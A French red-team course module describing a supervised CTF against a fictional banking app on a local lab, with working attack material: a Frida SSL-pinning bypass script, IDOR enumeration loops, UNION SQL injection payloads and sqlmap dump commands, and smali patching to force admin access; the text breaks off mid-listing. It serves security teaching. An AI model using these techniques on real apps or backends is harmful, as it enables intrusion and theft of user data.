# Module 14 — Synthèse & CTF Encadré : Opération "PayVault"

**Durée :** 1h30  
**Niveau :** M2 — Red Team  
**Prérequis :** Modules 1 à 13  
**Type :** CTF (Capture The Flag) encadré — Red Team vs Application mobile bancaire

---

## Table des matières

1. [Contexte du CTF](#1-contexte-du-ctf)
2. [Règles d'engagement (ROE)](#2-règles-dengagement-roe)
3. [Les 5 Flags](#3-les-5-flags)
4. [Structure du déroulé](#4-structure-du-déroulé)
5. [Template de documentation](#5-template-de-documentation)

---

## 1. Contexte du CTF

### 1.1 Scénario

```
┌──────────────────────────────────────────────────────────────────┐
│         OPÉRATION "PAYVAULT" — SCÉNARIO RED TEAM                 │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Votre équipe Red Team est mandatée par la banque "EuroSecure"   │
│  pour évaluer la sécurité de leur nouvelle application mobile    │
│  bancaire "PayVault".                                            │
│                                                                  │
│  Contexte professionnel :                                        │
│  ─────────────────────────────────────────────────────────────   │
│  EuroSecure vient de lancer PayVault, une application Android    │
│  permettant à ses clients de gérer leurs comptes, effectuer      │
│  des virements, et consulter leurs investissements.              │
│                                                                  │
│  Avant la mise en production complète, la DSI souhaite un test   │
│  d'intrusion complet de type Red Team, avec un scénario réaliste │
│  de compromission via l'application mobile.                      │
│                                                                  │
│  Objectif de la mission :                                        │
│  ─────────────────────────────────────────────────────────────   │
│  En partant UNIQUEMENT de l'APK fournie, vous devez compromettre │
│  l'infrastructure backend et exfiltrer les 5 flags qui prouvent  │
│  la réussite de chaque étape de l'attaque.                       │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 1.2 Architecture cible

```
┌──────────────────────────────────────────────────────────────────┐
│             ARCHITECTURE DE L'INFRASTRUCTURE CIBLE               │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────────────┐                                         │
│  │   APK PayVault      │ ← Fichier fourni aux apprenants        │
│  │   (com.payvault.app)│                                         │
│  └──────────┬──────────┘                                         │
│             │ HTTPS (TLS 1.2)                                    │
│             ▼                                                    │
│  ┌─────────────────────────────────────────────────────────┐    │
│  │              DOCKER — Backend PayVault                    │    │
│  │              (localhost:9090 sur la VM de test)           │    │
│  │                                                          │    │
│  │  ┌──────────────────┐  ┌──────────────────┐              │    │
│  │  │ API REST         │  │ Base de données   │              │    │
│  │  │ - /api/v1/auth   │  │ PostgreSQL        │              │    │
│  │  │ - /api/v1/users  │  │ - users           │              │    │
│  │  │ - /api/v1/trans. │  │ - transactions    │              │    │
│  │  │ - /api/v1/admin  │  │ - accounts        │              │    │
│  │  └──────────────────┘  │ - flags           │              │    │
│  │                        └──────────────────┘              │    │
│  └─────────────────────────────────────────────────────────┘    │
│                                                                  │
│  Cibles :                                                        │
│  ───────                                                        │
│  • APK fournie : PayVault_v2.1.3.apk                            │
│  • Backend : http://localhost:9090 (depuis la VM)               │
│  • L'APK communique avec le backend via HTTPS                   │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

```bash
# === PRÉPARATION DU LAB ===
# 1. Récupérer l'APK cible
wget http://10.0.1.100:8080/PayVault_v2.1.3.apk -O PayVault_v2.1.3.apk
# Alternative si le serveur HTTP n'est pas disponible :
# scp etudiant@lab-server:/opt/lab/payvault/PayVault_v2.1.3.apk .

# 2. Installer sur le device/émulateur connecté
adb install PayVault_v2.1.3.apk

# 3. Lancer le backend PayVault (dans un terminal séparé)
docker run -d -p 9090:9090 --name payvault-backend registry.gitlab.com/sdv-m2/payvault-backend:latest
# Vérifier que le backend répond :
curl http://localhost:9090/health
```

### 1.3 Les 5 Flags

```
┌──────────────────────────────────────────────────────────────────┐
│                  CARTE DES 5 FLAGS DU CTF "PAYVAULT"             │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Flag 1 — CREDS HARDCODÉES                                      │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ Difficulté : ★☆☆☆☆ (Facile)                               │ │
│  │ Domaine    : Analyse statique d'APK                        │ │
│  │ Technique  : T1552.001 (Credentials in Files)              │ │
│  │ Format     : FLAG{cr3d5_h4rdc0d3d_dans_apk_xxxx}           │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  Flag 2 — INTERCEPTION API BYPASS SSL PINNING                    │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ Difficulté : ★★☆☆☆ (Moyen)                                │ │
│  │ Domaine    : Interception réseau, SSL Pinning bypass       │ │
│  │ Technique  : T1643 (SSL Pinning Bypass), T1040 (Sniffing)  │ │
│  │ Format     : FLAG{byp4ss_ssl_p1nn1ng_r3uss1_xxxx}          │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  Flag 3 — IDOR VIA API MOBILE                                    │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ Difficulté : ★★★☆☆ (Intermédiaire)                        │ │
│  │ Domaine    : Contrôle d'accès, IDOR                        │ │
│  │ Technique  : T1548 (Insecure Direct Object Reference)      │ │
│  │ Format     : FLAG{1d0r_us3r_d4t4_l34k_xxxx}                │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  Flag 4 — SQL INJECTION BACKEND                                  │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ Difficulté : ★★★★☆ (Avancé)                               │ │
│  │ Domaine    : Injection SQL via API mobile                  │ │
│  │ Technique  : T1190 (Exploit Public-Facing Application)     │ │
│  │ Format     : FLAG{sql1_back3nd_c0mpr0m1s_xxxx}             │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
│  Flag 5 — REVERSE ENGINEERING + PATCHER L'APK                    │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │ Difficulté : ★★★★★ (Expert)                               │ │
│  │ Domaine    : Reverse engineering Android, smali patching   │ │
│  │ Technique  : T1574.010 (App Modification), T1406.002 (Smali)│ │
│  │ Format     : FLAG{p4tch3d_4pk_4dm1n_4cc3ss_xxxx}           │ │
│  └────────────────────────────────────────────────────────────┘ │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

---

## 2. Règles d'engagement (ROE)

### 2.1 Périmètre autorisé

| Élément | Autorisé ? | Détail |
|---------|-----------|--------|
| Analyse statique de l'APK | OUI | Décompilation, extraction strings, analyse manifest |
| Analyse dynamique de l'APK | OUI | Sur émulateur Android ou appareil dédié |
| Interception réseau | OUI | Proxy MITM entre l'APK et le backend |
| Scan du backend (localhost:9090) | OUI | Endpoints API REST uniquement |
| SQL Injection | OUI | Sur les endpoints découverts |
| Exploitation backend | OUI | Dans la limite du scope |
| Attaquer d'autres cibles | NON | Périmètre strict : APK + localhost:9090 |
| DoS / DDoS | NON | Pas de déni de service |
| Changer le mot de passe admin | NON | Ne pas rendre l'environnement inutilisable |

### 2.2 Règles de documentation obligatoire

Chaque flag soumis DOIT être accompagné de :

1. **Le flag lui-même** (format : `FLAG{...}`)
2. **La technique MITRE ATT&CK** utilisée (TXXXX)
3. **La commande exacte** ou l'outil utilisé
4. **Une capture d'écran** ou copie de la sortie prouvant la réussite
5. **L'impact business** : ce que cette vulnérabilité permettrait dans un contexte réel

### 2.3 Système d'indices

Les apprenants peuvent demander des indices au formateur. Chaque indice coûte du temps sur le chronomètre global :

| Niveau d'indice | Coût | Description |
|----------------|------|-------------|
| Indice léger | +1 min | Une piste, un fichier à regarder |
| Indice moyen | +3 min | La technique à utiliser (sans la commande exacte) |
| Indice complet | +5 min | La solution détaillée (dernier recours) |

### 2.4 Déroulement attendu

```
┌──────────────────────────────────────────────────────────────────┐
│         CHRONOLOGIE TYPE — OPÉRATION "PAYVAULT" (1h30)           │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  00:00 — 00:05   Briefing, distribution de l'APK, setup env.    │
│  00:05 — 00:15   Flag 1 : Analyse statique APK                  │
│  00:15 — 00:30   Flag 2 : Interception réseau, SSL Pinning      │
│  00:30 — 00:45   Flag 3 : IDOR sur l'API                        │
│  00:45 — 01:10   Flag 4 : SQL Injection backend                 │
│  01:10 — 01:25   Flag 5 : Reverse engineering, patching APK     │
│  01:25 — 01:30   Rendu final, soumission des flags              │
│                                                                  │
│  Les durées sont indicatives. Les flags 1-2-3 sont indépendants  │
│  et peuvent être réalisés dans n'importe quel ordre.             │
│  Les flags 4-5 dépendent partiellement des flags 1-2-3.          │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 2.5 Évaluation

| Critère | Points |
|---------|--------|
| Flag 1 validé | 10 pts |
| Flag 2 validé | 15 pts |
| Flag 3 validé | 20 pts |
| Flag 4 validé | 25 pts |
| Flag 5 validé | 30 pts |
| Documentation complète (tous les flags) | 10 pts bonus |
| **TOTAL MAXIMUM** | **110 pts** |

| Note | Score minimum |
|------|--------------|
| A (Excellent) | 90 pts |
| B (Très bien) | 70 pts |
| C (Bien) | 50 pts |
| D (Passable) | 30 pts |

---

## 3. Les 5 Flags

### 3.1 Flag 1 — Analyse Statique : Credentials Hardcodés

#### 3.1.1 Énoncé

> *"Le développeur de PayVault a laissé des informations sensibles dans le code source de l'application. Analysez l'APK pour extraire des credentials qui vous permettront d'accéder à l'API backend."*

#### 3.1.2 Contexte technique

Les développeurs peu expérimentés laissent souvent des clés API, tokens, ou mots de passe dans le code source. Dans une application Android, ces informations peuvent se trouver dans :
- Le fichier `AndroidManifest.xml`
- Les ressources `res/values/strings.xml`
- Les classes Java/Kotlin décompilées (`smali/` ou `sources/`)
- Les fichiers de configuration (`assets/`, `raw/`)
- Les bibliothèques natives (`lib/`)

#### 3.1.3 Outils recommandés

| Outil | Usage |
|-------|-------|
| `apktool` | Décompilation de l'APK en smali + ressources |
| `jadx-gui` | Décompilation en Java lisible (GUI) |
| `strings` | Extraction des chaînes de caractères |
| `grep -r` | Recherche dans l'arborescence décompilée |
| `dex2jar` + `jd-gui` | Alternative décompilation |

#### 3.1.4 Indices disponibles

| Niveau | Indice |
|--------|--------|
| Léger (+1 min) | Cherchez dans les ressources et le code source décompilé |
| Moyen (+3 min) | Les credentials sont souvent stockés dans `strings.xml` ou en constante dans une classe `Config` |
| Complet (+5 min) | Utilisez `grep -r "api"` ou `grep -r "password"` dans le dossier décompilé |

#### 3.1.5 Mapping MITRE ATT&CK

| Technique | ID | Description |
|-----------|-----|-------------|
| Unsecured Credentials: Credentials in Files | T1552.001 | Credentials stockés en clair dans le code source |
| Application Layer Protocol: Web Protocols | T1071.001 | Utilisation des credentials pour API HTTP |

---

### 3.2 Flag 2 — Interception Réseau : Bypass SSL Pinning

#### 3.2.1 Énoncé

> *"L'application PayVault communique avec son backend via HTTPS et utilise le SSL Pinning pour empêcher l'interception. Contournez cette protection pour intercepter les requêtes API et capturer le flag qui transite dans une requête authentifiée."*

#### 3.2.2 Contexte technique

```
┌──────────────────────────────────────────────────────────────────┐
│              SSL PINNING — PRINCIPE ET CONTOURNEMENT             │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  SSL Pinning normal :                                            │
│  ┌──────────┐      ┌──────────────┐      ┌──────────┐           │
│  │ App      │─────▶│ Certificat   │─────▶│ Backend  │           │
│  │ PayVault │      │ connu (pinné)│      │          │           │
│  └──────────┘      └──────────────┘      └──────────┘           │
│                                                                  │
│  Avec Burp (SSL Pinning actif) :                                 │
│  ┌──────────┐      ┌──────────────┐      ┌──────────┐           │
│  │ App      │──X──▶│ Cert Burp    │─ ─ ─▶│ Backend  │           │
│  │ PayVault │  ❌  │ (non pinné)  │       │          │           │
│  └──────────┘      └──────────────┘      └──────────┘           │
│  Erreur: SSLHandshakeException (le certificat Burp est rejeté)   │
│                                                                  │
│  SOLUTION — Frida script pour bypass SSL Pinning :               │
│  ┌──────────┐      ┌──────────────┐      ┌──────────┐           │
│  │ App      │─────▶│ Frida hook   │─────▶│ Burp     │──────▶    │
│  │ PayVault │      │ (bypass pin) │      │ Proxy    │ Backend   │
│  └──────────┘      └──────────────┘      └──────────┘           │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### 3.2.3 Approches de contournement

**Approche A — Frida (recommandée) :**

```javascript
// T1643 — Frida script universel de bypass SSL Pinning Android
// Sauvegarder sous ssl_bypass.js

setTimeout(function() {
    Java.perform(function() {
        console.log("[*] SSL Pinning Bypass - PayVault Operation");
        
        // Méthode 1 : TrustManager custom (accepte tous les certificats)
        var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        
        // Créer un TrustManager qui accepte tout
        var TrustAllCerts = Java.registerClass({
            name: 'com.payvault.bypass.TrustAllCerts',
            implements: [TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
        
        // Initialiser SSLContext avec le TrustManager bypass
        var sslContext = SSLContext.getInstance("TLS");
        sslContext.init(null, [TrustAllCerts.$new()], null);
        SSLContext.setDefault(sslContext);
        
        console.log("[+] SSLContext default modifié - TrustAll actif");
        
        // Méthode 2 : Hook des classes courantes de SSL Pinning
        // OkHttp CertificatePinner
        try {
            var CertificatePinner = Java.use('okhttp3.CertificatePinner');
            CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
                console.log("[+] OkHttp CertificatePinner bypassed for: " + hostname);
                return;
            };
        } catch(e) {
            console.log("[*] OkHttp CertificatePinner non trouvé");
        }
        
        // Trustkit (DataTheorem)
        try {
            var TrustKit = Java.use('com.datatheorem.android.trustkit.pinning.TrustKit');
            TrustKit.getInstance.implementation = function() {
                console.log("[+] TrustKit bypassed");
                return null;
            };
        } catch(e) {
            console.log("[*] TrustKit non trouvé");
        }
        
        // Appcelerator Titanium
        try {
            var PinningTrustManager = Java.use('appcelerator.https.PinningTrustManager');
            PinningTrustManager.checkServerTrusted.implementation = function(chain, authType) {
                console.log("[+] Appcelerator PinningTrustManager bypassed");
            };
        } catch(e) {}
        
        console.log("[+] SSL Pinning bypass activé - L'application accepte désormais les certificats Burp");
    });
}, 0);
```

**Approche B — Objection (automatisé) :**

```bash
# T1643 — Utilisation d'Objection pour bypass SSL Pinning
# Objection est un outil basé sur Frida avec des scripts pré-packagés

# Lancer Objection sur l'application PayVault
objection -g com.payvault.app explore

# Dans la console Objection, activer le bypass SSL Pinning
# android sslpinning disable

# L'application est maintenant instrumentée et accepte tous les certificats
```

**Approche C — Patch APK (si Frida n'est pas disponible) :**

```bash
# T1643 — Patcher l'APK pour désactiver le SSL Pinning
# Cette approche modifie l'APK pour retirer les vérifications de certificat

# Décompiler
apktool d PayVault_v2.1.3.apk -o payvault_patched

# Modifier le Network Security Config (si présent)
# Fichier : payvault_patched/res/xml/network_security_config.xml
# Ajouter <certificates src="system" /> ou <trust-anchors>
# Ou simplement passer en mode debug:
# Ajouter android:networkSecurityConfig="@xml/network_security_config"

# Dans AndroidManifest.xml, ajouter :
# <application android:networkSecurityConfig="@xml/network_security_config" ...>

# Recompiler
apktool b payvault_patched -o PayVault_patched.apk

# Signer
keytool -genkey -v -keystore debug.keystore -alias debug -keyalg RSA -keysize 2048 -validity 365 -storepass android -keypass android -dname "CN=Debug"
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore debug.keystore PayVault_patched.apk debug
```

#### 3.2.4 Setup du proxy d'interception (Burp Suite)

```
┌──────────────────────────────────────────────────────────────────┐
│        CONFIGURATION BURP SUITE POUR INTERCEPTION MOBILE          │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Étape 1 : Configurer Burp Proxy sur toutes les interfaces       │
│  ─────────────────────────────────────────────────────────────   │
│  Proxy → Options → Add listener:                                 │
│    - Bind to port: 8080                                          │
│    - Bind to address: All interfaces                             │
│                                                                  │
│  Étape 2 : Exporter le certificat Burp CA                        │
│  ─────────────────────────────────────────────────────────────   │
│  Proxy → Options → Import/Export CA certificate                  │
│    - Export → Certificate in DER format → cacert.der             │
│                                                                  │
│  Étape 3 : Pousser le certificat sur l'émulateur/appareil        │
│  ─────────────────────────────────────────────────────────────   │
│  adb push cacert.der /sdcard/                                    │
│  adb shell settings put global http_proxy <IP_HOST>:8080          │
│                                                                  │
│  Étape 4 : Installer le certificat comme CA système (root)       │
│  ─────────────────────────────────────────────────────────────   │
│  Paramètres → Sécurité → Installer certificat → CA               │
│  OU (appareil rooté) :                                           │
│  adb root                                                        │
│  adb remount                                                     │
│  adb push cacert.der /system/etc/security/cacerts/               │
│                                                                  │
│  Étape 5 : VÉRIFIER avec curl (test préalable)                   │
│  ─────────────────────────────────────────────────────────────   │
│  curl -x http://localhost:8080 -k https://localhost:9090/api/v1/  │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### 3.2.5 Indices disponibles

| Niveau | Indice |
|--------|--------|
| Léger (+1 min) | Utilisez Frida pour contourner le SSL Pinning |
| Moyen (+3 min) | Cherchez un script Frida générique de bypass SSL Pinning, ou utilisez Objection |
| Complet (+5 min) | `frida -U -f com.payvault.app -l ssl_bypass.js --no-pause` puis configurez le proxy Wi-Fi de l'émulateur vers Burp |

---

### 3.3 Flag 3 — IDOR via API Mobile

#### 3.3.1 Énoncé

> *"Maintenant que vous interceptez le trafic API, explorez les endpoints. L'application PayVault expose des endpoints utilisateur qui souffrent d'un problème de contrôle d'accès (IDOR). Exploitez cette faille pour accéder aux données d'un autre utilisateur."*

#### 3.3.2 Contexte technique — IDOR expliqué

```
┌──────────────────────────────────────────────────────────────────┐
│          IDOR (INSECURE DIRECT OBJECT REFERENCE) — T1548          │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  Scénario normal :                                               │
│  ┌──────────┐                                                    │
│  │ User A   │────GET /api/v1/users/123/profile ────▶ Profile A   │
│  │ (ID: 123)│                                                    │
│  └──────────┘                                                    │
│                                                                  │
│  Tentative IDOR (sans contrôle côté serveur) :                   │
│  ┌──────────┐                                                    │
│  │ User A   │────GET /api/v1/users/456/profile ────▶ Profile B ! │
│  │ (ID: 123)│         ↑                                         │
│  └──────────┘         └── ID modifié manuellement               │
│                                                                  │
│  Le serveur ne vérifie PAS que l'utilisateur authentifié          │
│  a le droit d'accéder à la ressource demandée.                   │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### 3.3.3 Endpoints probables à tester

L'application PayVault expose probablement ces endpoints :

```
GET    /api/v1/auth/login          # Authentification
POST   /api/v1/auth/login          # Login (reçoit JWT token)
GET    /api/v1/users/me            # Profil utilisateur courant
GET    /api/v1/users/{id}          # Profil par ID ← IDOR potentiel
GET    /api/v1/users/{id}/accounts # Comptes bancaires
GET    /api/v1/users/{id}/transactions # Transactions
GET    /api/v1/transactions/{id}   # Détail transaction
PUT    /api/v1/users/{id}          # Modification profil ← IDOR potentiel
POST   /api/v1/transfers           # Virement
```

#### 3.3.4 Stratégie d'exploitation

```bash
# T1548 — Exploitation d'IDOR via l'API PayVault

# Étape 1 : S'authentifier normalement avec les credentials du Flag 1
TOKEN=$(curl -s -X POST http://localhost:9090/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username":"dev_user","password":"P@ssw0rd2024!"}' \
    | jq -r '.token')

echo "[+] Token JWT obtenu : $TOKEN"

# Étape 2 : Vérifier son propre profil
curl -s http://localhost:9090/api/v1/users/me \
    -H "Authorization: Bearer $TOKEN" | jq .

# Résultat typique :
# {
#   "id": 1,
#   "username": "dev_user",
#   "email": "dev@payvault.local",
#   "role": "user"
# }

# Étape 3 : Tester l'IDOR — accéder au profil utilisateur ID=2
curl -s http://localhost:9090/api/v1/users/2 \
    -H "Authorization: Bearer $TOKEN" | jq .

# Si IDOR présent, on voit les données de l'utilisateur 2
# {
#   "id": 2,
#   "username": "jdoe",
#   "email": "john.doe@example.com",
#   "role": "user",
#   "secret_note": "FLAG{1d0r_us3r_d4t4_l34k_xxxx}"
# }

# Étape 4 : Automatiser l'itération sur les IDs
for id in $(seq 1 20); do
    result=$(curl -s -o /dev/null -w "%{http_code}" \
        http://localhost:9090/api/v1/users/$id \
        -H "Authorization: Bearer $TOKEN")
    if [ "$result" -eq 200 ]; then
        echo "[+] ID $id accessible"
        curl -s http://localhost:9090/api/v1/users/$id \
            -H "Authorization: Bearer $TOKEN" | jq -r '.secret_note // "pas de secret"'
    fi
done

# Étape 5 : Tester d'autres endpoints IDOR
# /api/v1/users/{id}/accounts
curl -s http://localhost:9090/api/v1/users/2/accounts \
    -H "Authorization: Bearer $TOKEN" | jq .

# /api/v1/users/{id}/transactions
curl -s http://localhost:9090/api/v1/users/2/transactions \
    -H "Authorization: Bearer $TOKEN" | jq .
```

#### 3.3.5 Variante avancée : IDOR avec Burp Intruder

```
┌──────────────────────────────────────────────────────────────────┐
│          EXPLOITATION IDOR AUTOMATISÉE VIA BURP INTRUDER         │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Intercepter une requête GET /api/v1/users/1                  │
│  2. Envoyer à Intruder (Ctrl+I)                                  │
│  3. Positionner le payload sur le paramètre ID :                 │
│     GET /api/v1/users/§1§ HTTP/1.1                               │
│                      ↑                                           │
│  4. Payload type : Numbers, From: 1, To: 100, Step: 1            │
│  5. Options → Grep - Match : ajouter "FLAG{"                     │
│  6. Lancer l'attaque (Start Attack)                              │
│  7. Filtrer les résultats avec "FLAG{" dans la réponse           │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### 3.3.6 Indices disponibles

| Niveau | Indice |
|--------|--------|
| Léger (+1 min) | Une fois connecté, essayez de changer l'ID dans l'URL de profil |
| Moyen (+3 min) | Parcourez les IDs de 1 à 20 sur l'endpoint `/api/v1/users/{id}` |
| Complet (+5 min) | Utilisez Burp Intruder avec un payload numérique sur `/api/v1/users/{id}` et greppez "FLAG" |

---

### 3.4 Flag 4 — SQL Injection sur le Backend

#### 3.4.1 Énoncé

> *"En explorant les endpoints de l'API découverts via le reverse engineering de l'APK, vous avez identifié un endpoint de recherche vulnérable à l'injection SQL. Exploitez cette faille pour extraire le flag de la base de données."*

#### 3.4.2 Découverte de l'endpoint vulnérable

```
┌──────────────────────────────────────────────────────────────────┐
│          DÉCOUVERTE D'ENDPOINT VIA REVERSE ENGINEERING APK       │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  En décompilant l'APK avec jadx-gui, on trouve une classe :      │
│                                                                  │
│  com.payvault.api.ApiEndpoints.java                              │
│  ─────────────────────────────────────────────────────────────   │
│  public interface ApiService {                                   │
│      @GET("/api/v1/users/me")                                    │
│      Call<User> getMyProfile();                                  │
│                                                                  │
│      @GET("/api/v1/users/{id}")                                  │
│      Call<User> getUser(@Path("id") int userId);                 │
│                                                                  │
│      @GET("/api/v1/search")           ← ENDPOINT CACHÉ !         │
│      Call<SearchResult> search(                                  │
│          @Query("q") String query                                │
│      );                                                          │
│                                                                  │
│      @GET("/api/v1/admin/stats")      ← ENDPOINT ADMIN CACHÉ     │
│      Call<AdminStats> getStats(                                  │
│          @Header("X-Admin-Token") String token                   │
│      );                                                          │
│  }                                                               │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

#### 3.4.3 Exploitation manuelle de la SQLi

```bash
# T1190 — SQL Injection sur /api/v1/search

# Étape 1 : Tester l'injection avec une charge basique
# Le paramètre "q" est injecté directement dans une requête SQL
curl -s "http://localhost:9090/api/v1/search?q=test" \
    -H "Authorization: Bearer $TOKEN" | jq .

# Résultat normal (recherche fonctionnelle)
# {"results": [], "count": 0}

# Étape 2 : Détecter l'injection — ajouter une apostrophe
curl -s "http://localhost:9090/api/v1/search?q=test'" \
    -H "Authorization: Bearer $TOKEN"

# Résultat si vulnérable :
# {"error": "SQL error: syntax error at or near \"'\" ..."}
# → SQLi confirmée ! Le paramètre q est injecté dans une requête SQL

# Étape 3 : Identifier le type de base — PostgreSQL probable (stack Docker)
# Test : requête PostgreSQL spécifique
curl -s "http://localhost:9090/api/v1/search?q=test' UNION SELECT version(),NULL,NULL--" \
    -H "Authorization: Bearer $TOKEN" | jq .

# RÉPONSE TYPIQUE :
# {"results": [{"name":"PostgreSQL 15.4 on x86_64-linux","description":"...","id":null}]}
# → PostgreSQL confirmé !

# Étape 4 : Énumérer les tables
curl -s "http://localhost:9090/api/v1/search?q=x' UNION SELECT table_name,table_schema,NULL FROM information_schema.tables WHERE table_schema NOT IN ('pg_catalog','information_schema')--" \
    -H "Authorization: Bearer $TOKEN" | jq .

# Résultat :
# {"results": [
#   {"name":"users","description":"public","id":null},
#   {"name":"transactions","description":"public","id":null},
#   {"name":"accounts","description":"public","id":null},
#   {"name":"flags","description":"public","id":null}
# ]}

# Étape 5 : Vider la table flags
curl -s "http://localhost:9090/api/v1/search?q=x' UNION SELECT flag_name,flag_value,challenge_order FROM flags--" \
    -H "Authorization: Bearer $TOKEN" | jq .

# RÉSULTAT — LE FLAG 4 !
# {"results": [
#   {"name":"flag_sqli","description":"FLAG{sql1_back3nd_c0mpr0m1s_xxxx}","id":4}
# ]}

# Étape 6 (bonus) : Exfiltrer les données utilisateurs
curl -s "http://localhost:9090/api/v1/search?q=x' UNION SELECT username,password_hash,email FROM users--" \
    -H "Authorization: Bearer $TOKEN" | jq .
```

#### 3.4.4 Exploitation automatisée avec sqlmap

```bash
# T1190 — SQL Injection automatisée avec sqlmap

# Étape 1 : Capturer une requête avec Burp et la sauvegarder
cat > search_request.txt << 'EOF'
GET /api/v1/search?q=test HTTP/1.1
Host: localhost:9090
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json
User-Agent: PayVault/2.1.3
Connection: close

EOF

# Étape 2 : Lancer sqlmap sur le paramètre q
sqlmap -r search_request.txt \
    -p q \
    --dbms=PostgreSQL \
    --level=3 \
    --risk=2 \
    --batch \
    --technique=U \
    --threads=5

# Options :
# -r : fichier de requête Burp
# -p q : paramètre à tester (q)
# --dbms=PostgreSQL : forcer le SGBD (plus rapide)
# --level=3 : tests plus agressifs
# --risk=2 : tests avec risque modéré
# --technique=U : UNION-based uniquement

# Étape 3 : Énumérer les bases de données
sqlmap -r search_request.txt -p q --dbms=PostgreSQL --dbs --batch

# Étape 4 : Énumérer les tables de la base "payvault"
sqlmap -r search_request.txt -p q --dbms=PostgreSQL \
    -D payvault --tables --batch

# Étape 5 : Dumper la table flags
sqlmap -r search_request.txt -p q --dbms=PostgreSQL \
    -D payvault -T flags --dump --batch

# Étape 6 (bonus) : Dumper toutes les tables
sqlmap -r search_request.txt -p q --dbms=PostgreSQL \
    -D payvault --dump-all --batch
```

#### 3.4.5 Construction de la query UNION (approche pédagogique)

```sql
-- T1190 — Construction pas à pas de la requête UNION SQLi

-- La requête originale est probablement :
-- SELECT name, description, id FROM search_index WHERE name ILIKE '%{query}%'

-- Étape 1 : Fermer la chaîne et ajouter UNION SELECT
-- q = x' UNION SELECT null,null,null--

-- Étape 2 : Déterminer le nombre de colonnes (ORDER BY / null technique)
-- q = x' ORDER BY 1--     → OK
-- q = x' ORDER BY 2--     → OK
-- q = x' ORDER BY 3--     → OK
-- q = x' ORDER BY 4--     → ERREUR → La requête a 3 colonnes

-- Étape 3 : Identifier les types de colonnes
-- q = x' UNION SELECT 'test',NULL,NULL--    → 'test' apparaît dans name    → colonne 1 = VARCHAR
-- q = x' UNION SELECT NULL,'test',NULL--    → 'test' apparaît dans desc   → colonne 2 = VARCHAR
-- q = x' UNION SELECT NULL,NULL,1--         → 1 apparaît dans id          → colonne 3 = INTEGER

-- Étape 4 : Extraire les données (payload final)
-- q = x' UNION SELECT flag_name, flag_value, challenge_order FROM flags--
```

#### 3.4.6 Indices disponibles

| Niveau | Indice |
|--------|--------|
| Léger (+1 min) | Cherchez dans le code décompilé un endpoint de recherche non documenté |
| Moyen (+3 min) | Ajoutez une apostrophe dans le paramètre de recherche. Si erreur SQL → SQLi confirmée |
| Complet (+5 min) | UNION SELECT table_name FROM information_schema.tables, puis dump de la table flags |

---

### 3.5 Flag 5 — Reverse Engineering : Patcher l'APK pour devenir Admin

#### 3.5.1 Énoncé

> *"Vous avez collecté beaucoup d'informations sur l'application et le backend. Votre dernier défi est de modifier l'APK pour élever vos privilèges au niveau administrateur, puis d'invoquer l'endpoint admin qui vous révélera le flag final."*

#### 3.5.2 Analyse préliminaire

Dans le code décompilé (jadx), on identifie la logique de vérification du rôle :

```java
// com.payvault.auth.SessionManager.java
public class SessionManager {
    private static final String PREFS_NAME = "payvault_prefs";
    private static final String KEY_ROLE = "user_role";
    
    public boolean isAdmin() {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, 0);
        String role = prefs.getString(KEY_ROLE, "user");
        return "admin".equals(role);
    }
    
    public String getRole() {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, 0);
        return prefs.getString(KEY_ROLE, "user");
    }
}
```

Pour devenir admin, il faut modifier la logique pour que `isAdmin()` retourne toujours `true`.

#### 3.5.3 Méthode de patching SMALI

```bash
# T1574.010 — Patcher l'APK via modification smali

# Étape 1 : Décompiler l'APK avec apktool
apktool d PayVault_v2.1.3.apk -o payvault_unpacked
echo "[+] APK décompilé dans : payvault_unpacked/"

# Étape 2 : Trouver le fichier smali de SessionManager
find payvault_unpacked -name "SessionManager.smali" -o -name "SessionManager*"
# Résultat :
# payvault_unpacked/smali/com/payvault/auth/SessionManager.smali

# Étape 3 : Lire le code smali de la méthode isAdmin()
cat payvault_unpacked/smali/com/payvault/auth/SessionManager.smali | grep -A 30 "isAdmin"

# Contenu typique de isAdmin() en smali :
# .method public isAdmin()Z
#     .locals 3
#
#     iget-object v0, p0, Lcom/payvault/auth/SessionManager;->context:Landroid/content/Context;
#     const-string v1, "payvault_prefs"
#     const/4 v2, 0x0
#     invoke-virtual {v0, v1, v2}, ...
#     move-result-object v0
#     const-string v1, "user_role"
#     const-string v2, "user"
